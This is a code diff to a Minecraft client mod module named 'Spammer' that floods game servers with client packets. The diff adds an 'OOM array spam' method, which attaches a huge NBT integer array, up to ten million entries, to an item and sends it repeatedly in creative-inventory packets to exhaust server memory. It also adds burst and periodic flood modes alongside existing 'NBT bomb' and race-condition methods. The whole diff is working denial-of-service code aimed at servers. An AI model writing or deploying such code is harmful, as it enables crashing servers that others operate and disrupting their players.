@@ -35,7 +35,8 @@ public class Spammer extends Module {
         Race("Race condition combo"),
         CreativeBomb("Creative NBT bomb"),
         TabComplete("Tab complete spam"),
-        InteractItem("Item use spam");
+        InteractItem("Item use spam"),
+        OOM("OOM array spam");
 
         private final String title;
         Method(String title) { this.title = title; }
@@ -51,6 +52,56 @@ public class Spammer extends Module {
         .build()
     );
 
+    private final Setting<Integer> arraySize = sgGeneral.add(new IntSetting.Builder()
+        .name("array-size")
+        .description("Size of IntArray for OOM method")
+        .defaultValue(500000)
+        .min(1)
+        .max(10000000)
+        .sliderRange(1, 10000000)
+        .visible(() -> method.get() == Method.OOM)
+        .build()
+    );
+
+    public enum SpamMode {
+        Continuous("Continuous"),
+        Burst("Single burst"),
+        Periodic("Periodic burst");
+
+        private final String title;
+        SpamMode(String title) { this.title = title; }
+        @Override public String toString() { return title; }
+    }
+
+    private final Setting<SpamMode> spamMode = sgGeneral.add(new EnumSetting.Builder<SpamMode>()
+        .name("spam-mode")
+        .description("Continuous spam or single-tick burst")
+        .defaultValue(SpamMode.Continuous)
+        .build()
+    );
+
+    private final Setting<Integer> burstCount = sgGeneral.add(new IntSetting.Builder()
+        .name("burst-count")
+        .description("Packets to send in a single burst")
+        .defaultValue(1000)
+        .min(1)
+        .max(100000)
+        .sliderRange(1, 100000)
+        .visible(() -> spamMode.get() == SpamMode.Burst || spamMode.get() == SpamMode.Periodic)
+        .build()
+    );
+
+    private final Setting<Integer> intervalSeconds = sgGeneral.add(new IntSetting.Builder()
+        .name("interval")
+        .description("Seconds between bursts")
+        .defaultValue(5)
+        .min(1)
+        .max(300)
+        .sliderRange(1, 60)
+        .visible(() -> spamMode.get() == SpamMode.Periodic)
+        .build()
+    );
+
     private final Setting<Integer> packetsPerTick = sgGeneral.add(new IntSetting.Builder()
         .name("packets-per-tick")
         .description("Packets per tick (20 ticks/sec)")
@@ -58,6 +109,7 @@ public class Spammer extends Module {
         .min(1)
         .max(10000)
         .sliderRange(1, 10000)
+        .visible(() -> spamMode.get() == SpamMode.Continuous)
         .build()
     );
 
@@ -66,6 +118,7 @@ public class Spammer extends Module {
     private boolean toggle = false;
     private boolean flip = false;
     private int payloadId = 0;
+    private int periodicTicks = 0;
 
     public Spammer() {
         super(Client2End.CATEGORY, "spammer", "C2S packet spammer with multiple methods");
@@ -75,7 +128,18 @@ public class Spammer extends Module {
     private void onTick(TickEvent.Post event) {
         if (!running || mc.player == null || mc.getNetworkHandler() == null) return;
 
-        int count = packetsPerTick.get();
+        int count;
+
+        switch (spamMode.get()) {
+            case Burst -> count = burstCount.get();
+            case Periodic -> {
+                periodicTicks++;
+                if (periodicTicks < intervalSeconds.get() * 20) return;
+                periodicTicks = 0;
+                count = burstCount.get();
+            }
+            default -> count = packetsPerTick.get();
+        }
 
         switch (method.get()) {
             case Sprint -> spamSprint(count);
@@ -87,10 +151,16 @@ public class Spammer extends Module {
             case CreativeBomb -> spamCreativeBomb(count);
             case TabComplete -> spamTabComplete(count);
             case InteractItem -> spamInteractItem(count);
+            case OOM -> spamOom(count);
         }
 
         sent += count;
         mc.player.sendMessage(Text.literal("[§5Spammer§r] §e" + sent + " §7(" + (count * 20) + "/sec)"), false);
+
+        if (spamMode.get() == SpamMode.Burst) {
+            mc.player.sendMessage(Text.literal("[§5Spammer§r] §cBurst complete: §e" + count + " §rpackets"), false);
+            toggle();
+        }
     }
 
     private void spamSprint(int count) {
@@ -194,6 +264,18 @@ public class Spammer extends Module {
         }
     }
 
+    private void spamOom(int count) {
+        int size = arraySize.get();
+        int[] data = new int[size];
+        ItemStack stack = new ItemStack(Items.DIAMOND);
+        NbtCompound nbt = new NbtCompound();
+        nbt.putIntArray("oom", data);
+        NbtComponent.set(DataComponentTypes.CUSTOM_DATA, stack, nbt);
+        for (int i = 0; i < count; i++) {
+            mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(1, stack));
+        }
+    }
+
     @Override
     public void onActivate() {
         running = true;
@@ -201,6 +283,7 @@ public class Spammer extends Module {
         toggle = false;
         flip = false;
         payloadId = 0;
+        periodicTicks = 0;
     }
 
     @Override
